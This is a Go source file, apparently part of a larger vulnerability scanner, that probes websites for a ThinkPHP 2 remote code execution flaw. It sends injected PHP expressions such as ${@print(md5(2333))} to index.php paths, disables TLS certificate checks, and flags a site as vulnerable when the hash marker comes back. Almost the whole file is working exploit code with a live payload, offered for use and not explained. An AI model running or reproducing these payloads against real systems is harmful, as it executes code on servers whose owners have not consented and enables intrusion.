package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

//payload: /index.php?s=/index/index/xxx/${@phpinfo()}

var payloads7 []string

func tp2_rce(baseurl string)  {
	flag := tp2_rce1(baseurl) //接受返回的payload
	if  flag != "0"{
		fmt.Println(baseurl," [+] vul ! ! !\npayload: ",flag)
	} else {
		fmt.Println(baseurl," [-] not vull tp2_RCE")
	}
}

func tp2_rce1(baseurl string) string  {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	payloads7 := append(payloads7,
		"/index.php/module/action/param1/$%7B@print%28md5%282333%29%29%7D", )
	for _, payload := range payloads7{
		flag := tp2_rce2(baseurl, payload)
		if flag != "0"{
			return flag
		}
		url := baseurl + "/public/index.php"+payload
		client := http.Client{
			Transport:     tr,
			CheckRedirect: nil,
			Jar:           nil,
			Timeout:       time.Second*5,
		}
		req, err := http.NewRequest("GET",url,nil)
		if err != nil {
			return "0"
		}
		req.Header.Set("User-Agent",user_agent)
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("[-] 请求超时，请检查url！ x.x")
			return "0"
		}
		body, _ := io.ReadAll(resp.Body)
		if (strings.Contains(string(body),"56540676a129760a3")){
			return payload
		} else {
			continue
		}
	}
	return "0"
}

func tp2_rce2(baseurl string,payload string) string {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	url := baseurl + payload
	client := http.Client{
		Transport:     tr,
		CheckRedirect: nil,
		Jar:           nil,
		Timeout:       time.Second*5,
	}
	req, err := http.NewRequest("GET",url,nil)
	if err != nil {
		return "0"
	}
	req.Header.Set("User-Agent",user_agent)
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("[-] 请求超时，请检查url！ x.x")
		return "0"
	}
	body, _ := io.ReadAll(resp.Body)
	if (strings.Contains(string(body),"56540676a129760a3")){
		return payload
	} else {
		return "0"
	}
}
